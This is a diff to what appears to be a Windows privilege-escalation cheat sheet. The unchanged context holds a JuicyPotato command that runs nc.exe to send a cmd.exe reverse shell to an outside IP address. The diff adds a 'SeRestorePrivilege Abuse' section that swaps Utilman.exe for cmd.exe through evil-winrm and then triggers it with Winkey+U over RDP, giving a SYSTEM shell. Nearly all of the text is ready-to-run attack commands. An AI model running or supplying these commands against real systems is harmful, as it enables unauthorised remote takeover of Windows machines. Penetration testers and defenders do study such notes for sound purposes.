@@ -108,6 +108,27 @@ reg query HKCR\CLSID /s /f LocalService
 .\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\Users\Public\nc.exe 10.10.15.34 8443 -e cmd.exe" -t * -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}"
 ```
 
+### SeRestorePrivilege Abuse
+
+- If RDP is enabled -> Winkey+U -> Utilman.exe
+
+On evil-winrm:
+```sh
+cd C:\Windows\system32
+
+ren Utilman.exe Utilman.old
+
+ren cmd.exe Utilman.exe
+```
+
+Then RDP:
+```sh
+rdesktop <IP>
+
+# Press Winkey + U
+whoami
+```
+
 ---
 
 ## 3. Service Misconfigurations
